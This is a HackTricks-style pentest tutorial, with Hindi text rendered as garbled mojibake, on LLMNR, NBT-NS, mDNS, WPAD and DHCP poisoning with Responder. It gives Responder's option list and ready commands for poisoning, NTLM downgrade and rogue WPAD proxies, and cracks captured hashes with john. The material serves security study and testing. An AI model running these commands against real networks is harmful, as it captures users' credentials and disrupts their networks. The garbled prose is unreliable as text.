# LLMNR, NBT-NS, mDNS/DNS рдФрд░ WPAD рд╕реНрдкреВрдлрд┐рдВрдЧ рдФрд░ рд░рд┐рд▓реЗ рдЕрдЯреИрдХреНрд╕

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ.
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВ.

</details>

## рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓реНрд╕

### LLMNR, NBT-NS, рдФрд░ mDNS

Microsoft рд╕рд┐рд╕реНрдЯрдореНрд╕ DNS рд▓реБрдХрдЕрдк рд╡рд┐рдлрд▓ рд╣реЛрдиреЗ рдкрд░ рд╕реНрдерд╛рдиреАрдп рд╣реЛрд╕реНрдЯ рд░рд┐рдЬрд╝реЙрд▓реНрдпреВрд╢рди рдХреЗ рд▓рд┐рдП Link-Local Multicast Name Resolution (LLMNR) рдФрд░ NetBIOS Name Service (NBT-NS) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред Apple Bonjour рдФрд░ Linux рдЬрд╝реАрд░реЛ-рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рднреАрддрд░ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдХреА рдЦреЛрдЬ рдХреЗ рд▓рд┐рдП Multicast DNS (mDNS) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдпреЗ рдкреНрд░реЛрдЯреЛрдХреЙрд▓реНрд╕ рдЕрдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ UDP рдкрд░ рд╕рдВрджреЗрд╢ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ; рдЗрд╕рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рдЙрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рд╕реЗрд╡рд╛рдУрдВ рдХреА рдУрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк Responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реЛрд╕реНрдЯреНрд╕ рджреНрд╡рд╛рд░рд╛ рдЦреЛрдЬреА рдЬрд╛ рд░рд╣реА рд╕реЗрд╡рд╛рдУрдВ рдХреА рдирдХрд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рднреЗрдЬрдХрд░ рд╕реЗрд╡рд╛рдУрдВ рдХреА рдирдХрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[Responder рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛рдУрдВ рдХреА рдирдХрд▓ рдХреИрд╕реЗ рдХрд░реЗрдВ](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) рдпрд╣рд╛рдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрдврд╝реЗрдВред

### WPAD

рдХрдИ рдмреНрд░рд╛рдЙрдЬрд╝рд░реНрд╕ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Web Proxy Auto-Discovery (WPAD) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред WPAD рд╕рд░реНрд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣рдЪрд╛рдиреЗ рдЬрд╛рдиреЗ рдкрд░ рдПрдХ рд╡рд┐рд╢реЗрд╖ URL (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, _http://wpad.example.org/wpad.dat_) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░реЙрдХреНрд╕реА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

* DHCP, рдХреЛрдб 252 рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNS, рд╕реНрдерд╛рдиреАрдп рдбреЛрдореЗрди рдореЗрдВ _wpad_ рд╣реЛрд╕реНрдЯрдиреЗрдо рдХреА рдЦреЛрдЬ рдХрд░рддреЗ рд╣реБрдП
* Microsoft LLMNR рдФрд░ NBT-NS (DNS рд▓реБрдХрдЕрдк рд╡рд┐рдлрд▓рддрд╛ рдХреА рд╕реНрдерд┐рддрд┐ рдореЗрдВ)

Responder WPAD рдЕрдЯреИрдХ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИтАФрдПрдХ рдкреНрд░реЙрдХреНрд╕реА рдЪрд▓рд╛рдХрд░ рдФрд░ DHCP, DNS, LLMNR, рдФрд░ NBT-NS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЛ рдПрдХ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг WPAD рд╕рд░реНрд╡рд░ рдХреА рдУрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИред

## рдкреНрд░реЛрдЯреЛрдХреЙрд▓реНрд╕ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ

### Responder - LLMNR, NBT-NS рдФрд░ MDNS

> Responder рдПрдХ LLMNR, NBT-NS рдФрд░ MDNS рдкреЙрдЗрдЬрд╝рдирд░ рд╣реИред рдпрд╣ _рд╡рд┐рд╢рд┐рд╖реНрдЯ_ NBT-NS (NetBIOS Name Service) рдХреНрд╡реЗрд░реАрдЬрд╝ рдХрд╛ рдЙрддреНрддрд░ рджреЗрдЧрд╛ рдЬреЛ рдЙрдирдХреЗ рдирд╛рдо рд╕рдлрд╝рд┐рдХреНрд╕ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╣реЛрддреА рд╣реИрдВ (рджреЗрдЦреЗрдВ: [http://support.microsoft.com/kb/163409](http://support.microsoft.com/kb/163409))ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдЯреВрд▓ рдХреЗрд╡рд▓ File Server Service рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрддреНрддрд░ рджреЗрдЧрд╛, рдЬреЛ SMB рдХреЗ рд▓рд┐рдП рд╣реИред
>
> рдЗрд╕рдХреЗ рдкреАрдЫреЗ рдХрд╛ рд╡рд┐рдЪрд╛рд░ рд╣рдорд╛рд░реЗ рдЙрддреНрддрд░реЛрдВ рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░рдирд╛ рд╣реИ, рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдЕрдзрд┐рдХ рдЪреБрдкрдХреЗ рд╕реЗ рд░рд╣рдирд╛ рд╣реИред рдпрд╣ рдпрд╣ рднреА рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╣рдо рд╡реИрдз NBT-NS рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдирд╣реАрдВ рддреЛрдбрд╝рддреЗ рд╣реИрдВред

* [**Responder**](https://github.com/lgandx/Responder) рдХрд╛рд▓реА рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ \*\*`/etc/responder/Responder.conf` \*\* рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ (рдпрд╣рд╛рдБ рдЖрдк рд░реЛрдЧ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)
* **Responder** рд╕реНрдХреНрд░реАрди рдкрд░ **рд╣реИрд╢реЗрдЬрд╝ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдЧрд╛** рдФрд░ рдЗрд╕реЗ рдкреНрд░рддрд┐ рд╣реЛрд╕реНрдЯ `/usr/share/responder/logs` рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдПрдХ **рд▓реЙрдЧ** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рд▓рд┐рдЦреЗрдЧрд╛**ред рд╣реИрд╢реЗрдЬрд╝ рдХреЛ `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt` рдлреЙрд░реНрдореЗрдЯ рдореЗрдВ рд╕реЗрд╡ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ
* рдЖрдк рдпрд╣рд╛рдБ **windows** рдХреЗ рд▓рд┐рдП Responder [рдпрд╣рд╛рдБ](https://github.com/lgandx/Responder-Windows) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ
* Responder **ipv4** рдФрд░ **ipv6** рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ

#### Responder Params

Responder рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ:
```
--version           show program's version number and exit
-h, --help          show this help message and exit
-A, --analyze       Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests without responding.
-I eth0, --interface=eth0
Network interface to use, you can use 'ALL' as a
wildcard for all interfaces
-i 10.0.0.21, --ip=10.0.0.21
Local IP to use (only for OSX)
-6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
Poison all requests with another IPv6 address than
Responder's one.
-e 10.0.0.22, --externalip=10.0.0.22
Poison all requests with another IP address than
Responder's one.
-b, --basic         Return a Basic HTTP authentication. Default: NTLM
-r, --wredir        Enable answers for netbios wredir suffix queries.
Answering to wredir will likely break stuff on the
network. Default: False
-d, --DHCP          Enable answers for DHCP broadcast requests. This
option will inject a WPAD server in the DHCP response.
Default: False
-D, --DHCP-DNS      This option will inject a DNS server in the DHCP
response, otherwise a WPAD server will be added.
Default: False
-w, --wpad          Start the WPAD rogue proxy server. Default value is
False
-u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
Upstream HTTP proxy used by the rogue WPAD Proxy for
outgoing requests (format: host:port)
-F, --ForceWpadAuth Force NTLM/Basic authentication on wpad.dat file
retrieval. This may cause a login prompt. Default:
False
-P, --ProxyAuth     Force NTLM (transparently)/Basic (prompt)
authentication for the proxy. WPAD doesn't need to be
ON. This option is highly effective when combined with
-r. Default: False
--lm                Force LM hashing downgrade for Windows XP/2003 and
earlier. Default: False
--disable-ess       Force ESS downgrade. Default: False
-v, --verbose       Increase verbosity.
```
<details>

<summary>рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рджрд╛рддрд╛ рдкреИрд░рд╛рдореАрдЯрд░</summary>

* `-A` рдлреНрд▓реИрдЧ рд╣рдореЗрдВ **рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдореЛрдб** рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдо NBT-NS, BROWSER, рдФрд░ LLMNR рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдкрд░реНрдпрд╛рд╡рд░рдг рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЬрд╣рд░ рджрд┐рдПред
* рд╣рдореЗрдВ рд╣рдореЗрд╢рд╛ рдПрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рдпрд╛ рдПрдХ IP рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред
* `-wf` WPAD рд░реЛрдЧреА рдкреНрд░реЙрдХреНрд╕реА рд╕рд░реНрд╡рд░ рд╢реБрд░реВ рдХрд░реЗрдЧрд╛
* `-f` рджреВрд░рд╕реНрде рд╣реЛрд╕реНрдЯ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдФрд░ рд╕рдВрд╕реНрдХрд░рдг рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛
* рдЕрдзрд┐рдХ рд╡рд░реНрдмреЛрд╕рд┐рдЯреА рдХреЗ рд▓рд┐рдП `-v` рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (рдХрдВрд╕реЛрд▓ рдкрд░ рдмрд╣реБрдд рдЕрдзрд┐рдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛ рдкреНрд░рд┐рдВрдЯ рд╣реЛрдЧрд╛)
* `-F` рдФрд░ `-P` рдЬреИрд╕реЗ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ NTLM рдпрд╛ рдмреЗрд╕рд┐рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдордЬрдмреВрд░ рдХрд░рдиреЗ рдФрд░ рдкреНрд░реЙрдХреНрд╕реА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдордЬрдмреВрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд▓реЙрдЧрд┐рди рдкреНрд░реЙрдореНрдкреНрдЯ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрдирдХрд╛ рд╕рдВрдпрдо рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред
* `-w` рдлреНрд▓реИрдЧ рдирд┐рд░реНрдорд┐рдд WPAD рдкреНрд░реЙрдХреНрд╕реА рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдмрдбрд╝реЗ рд╕рдВрдЧрдардиреЛрдВ рдореЗрдВ рдмрд╣реБрдд рдкреНрд░рднрд╛рд╡реА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рднреА HTTP рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░реЗрдЧрд╛ рдЬреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдкрд░ рд╣реЛрддреЗ рд╣реИрдВ рдЕрдЧрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ [рдСрдЯреЛ-рдбрд┐рдЯреЗрдХреНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕](https://docs.microsoft.com/en-us/internet-explorer/ie11-deploy-guide/auto-detect-settings-for-ie11) рд╕рдХреНрд╖рдо рд╣реЛред

</details>

#### рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рджрд╛рддрд╛ рдЪрд▓рд╛рдирд╛

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рджрд╛рддрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```bash
responder -I <Iface> #Default conf
responder -I <Iface> -P -r -v #More chances but might break things
```
рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рддрдХрдиреАрдХ рд╣реИ responder рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЬрдм рд╕рдВрднрд╡ рд╣реЛ рддреЛ рдбрд╛рдЙрдирдЧреНрд░реЗрдб рдХрд░рдирд╛ред рдЗрд╕рд╕реЗ **NTLMv1 рдЪреИрд▓реЗрдВрдЬ рдФрд░ рд░рд┐рд╕реНрдкреЙрдиреНрд╕ рдХреЛ рдХреИрдкреНрдЪрд░** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗрдЧреА рдмрдЬрд╛рдп NTLMv2 рдХреЗ рдЬрд┐рд╕реЗ **рдЖрд╕рд╛рдиреА рд╕реЗ рдХреНрд░реИрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** [**рдЗрд╕ рдЧрд╛рдЗрдб рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░рдХреЗ**](../../windows-hardening/ntlm/#ntlmv1-attack)**ред**
```bash
#Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"
responder -I <Iface> --lm --disable-ess #Downgrade NTLM authntication if possible and force ESS downgrade
```
**рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рдХреЗ рдЕрдиреБрд╕рд╛рд░, **WPAD рдХрд╛ рдЕрдиреБрдХрд░рдг рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**, рдкрд░рдВрддреБ рдЖрдк рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░рдХреЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
responder -I <Iface> --wpad
```
рдЖрдк **NetBIOS** рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рднреА **рдЕрдкрдиреЗ IP** рдХреЗ рд╕рд╛рде **рд╣рд▓** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдФрд░ рдПрдХ **authentication proxy** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
responder.py -I <interface> -Pv
```
```markdown
рдЖрдк NTLM рд╣реИрд╢реЗрдЬрд╝ рдХреЛ (рд╕рд╛рдорд╛рдиреНрдпрддрдГ) рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ, рдкрд░рдВрддреБ рдЖрдк **NTLM рдЪреИрд▓реЗрдВрдЬреЗрдЬрд╝ рдФрд░ рд░рд┐рд╕реНрдкреЙрдиреНрд╕реЗрдЬрд╝** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк _**john**_ рдХреЗ рд╡рд┐рдХрд▓реНрдк `--format=netntlmv2` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреНрд░реИрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдХрд╛рд▓реА рдореЗрдВ _**Responder**_ рдХреА рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдерд╛рдкрдирд╛ рдХреЗ **рд▓реЙрдЧреНрд╕ рдФрд░ рдЪреИрд▓реЗрдВрдЬреЗрдЬрд╝** `/usr/share/responder/logs` рдореЗрдВ рдкрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

#### Responder - DHCP Poisoning

Windows рдХрдИ рдХрд╕реНрдЯрдо DHCP рд╡рд┐рдХрд▓реНрдкреЛрдВ рдЬреИрд╕реЗ NetBIOS, WINS, WPAD рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдЬрдм рдХреЛрдИ рд╡рд░реНрдХрд╕реНрдЯреЗрд╢рди DHCP рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрд╕рдХреА рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХреЗрдВ, рдЗрди рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ DHCP рдЙрддреНрддрд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕реАрдзреА рдХрдиреЗрдХреНрдЯрд┐рд╡рд┐рдЯреА рдФрд░ рдирд╛рдо рд╕рдВрдХрд▓реНрдкрди рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдмрд┐рдирд╛ рд╡реНрдпрд╡рдзрд╛рди рдХреЗ DHCP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реНрдкреВрдл рдХрд░рдирд╛ рдЪреБрдиреМрддреАрдкреВрд░реНрдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рд╡рд░реНрдХрд╕реНрдЯреЗрд╢рди рдиреЗрдЯрд╡рд░реНрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░ рд░рд╣реЗ рд╣реЛрддреЗ рд╣реИрдВред рдЖрдорддреМрд░ рдкрд░, рдЖрдкрдХреЛ рд▓рдХреНрд╖реНрдп рд╕рдмрдиреЗрдЯ рдХреА рдмрд╣реБрдд рдЕрдЪреНрдЫреА рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рдЬреИрд╕реЗ рдХрд┐ DNS рд╕рд░реНрд╡рд░ рдХрд╣рд╛рдБ рд╣реИ, рд╕реНрд╡рд┐рдЪ рдХрд╣рд╛рдБ рд╣реИ, рд░реВрдЯрд┐рдВрдЧ рдЯреЗрдмрд▓, рдбреЛрдореЗрди, рдиреЗрдЯрдорд╛рд╕реНрдХ, DHCP рд╕рд░реНрд╡рд░, рдЖрджрд┐ред **рдЗрди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ рдХреЛрдИ рднреА рдЧрд▓рддреА рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рд╡реНрдпрд╡рдзрд╛рди рдХрд╛ рдХрд╛рд░рдг рдмрдиреЗрдЧреАред**

рд╣рд╛рд▓рд╛рдВрдХрд┐, DHCP рдЙрддреНрддрд░реЛрдВ рдХреЛ рд╕реНрдкреВрдл рдХрд░рдиреЗ рдХреЗ рдЕрдкрдиреЗ рдЕрдиреВрдареЗ рд▓рд╛рдн рд╣реИрдВред **рдпрд╣ ARP рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рд╕реЗ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдЕрдзрд┐рдХ рдЪреБрдкрдХреЗ рд╕реЗ рд╣реИ**; рдПрдХ рдпреВрдирд┐рдХрд╛рд╕реНрдЯ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреАрдбрд╝рд┐рдд рдХреА рд░реВрдЯрд┐рдВрдЧ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдкреЙрдЗрдЬрд╝рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ, рдпрд╣ рднреА рдЖрдо рд╣реИ рдХрд┐ рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдХрдИ DHCP рд╕рд░реНрд╡рд░ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред рдпреВрдирд┐рдХрд╛рд╕реНрдЯ DHCP рдЙрддреНрддрд░реЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИ, рдХреБрдЫ рд╕реНрд╡рд┐рдЪ DHCP рд╕реНрдиреВрдкрд┐рдВрдЧ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реБрд░рдХреНрд╖рд╛ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╡реЗ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рд╕реАрдзреА рдирд╣реАрдВ рд╣реЛрддреАрдВ рдФрд░ рдЕрдХреНрд╕рд░ рд╕рдХреНрд╖рдо рд╣реЛрдиреЗ рдкрд░ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЬрд╛рддреА рд╣реИрдВред

> рдпрд╣ рд╣рдорд▓рд╛ рдЕрддреНрдпрдВрдд рдкреНрд░рднрд╛рд╡реА рд╣реИ рдФрд░ рдЖрдкрдХреЛ NTLMv1/2 рд╣реИрд╢реЗрдЬрд╝ рдХреА рдЧрд╛рд░рдВрдЯреА рджреЗрддрд╛ рд╣реИред
```
```bash
./Responder.py -I eth0 -Pdv
```
#### Responder - рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рд╛рдЦ рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛

